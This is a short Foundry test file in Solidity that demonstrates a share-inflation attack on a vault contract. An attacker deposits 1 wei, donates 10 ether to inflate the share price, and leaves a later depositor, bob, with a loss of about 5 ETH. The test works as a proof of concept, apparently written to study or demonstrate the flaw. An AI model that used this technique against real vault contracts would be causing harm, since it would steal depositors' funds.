// SPDX=Licence-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "..//src/UnfairVault.sol";

contract UnfairVaultTest is Test {
    UnfairVault public vault;
    address public hacker = address(0x1337);
    address public bob = address(0x7508);

    function setUp() public {
        vault = new UnfairVault();
        vm.deal(hacker, 10.1 ether);
        vm.deal(bob, 20 ether);
    }

    function testVaultInflationExploit() public {
        vm.startPrank(hacker);
        vault.deposit{value: 1}();

        vault.receiveProfit{value: 10 ether}();
        vm.stopPrank();

        vm.startPrank(bob);
        vault.deposit{value: 20 ether}();
        vm.stopPrank();

        assertEq(vault.balanceOf(hacker), 1);
        assertEq(vault.balanceOf(bob), 1);

        vm.startPrank(hacker);
        vault.withdraw(1);
        vm.stopPrank();

        vm.startPrank(bob);
        vault.withdraw(1);
        vm.stopPrank();

        assertEq(address(vault).balance, 0);
        console.log("Bob final balance (Lost 5 ETH):", bob.balance);
    }
}
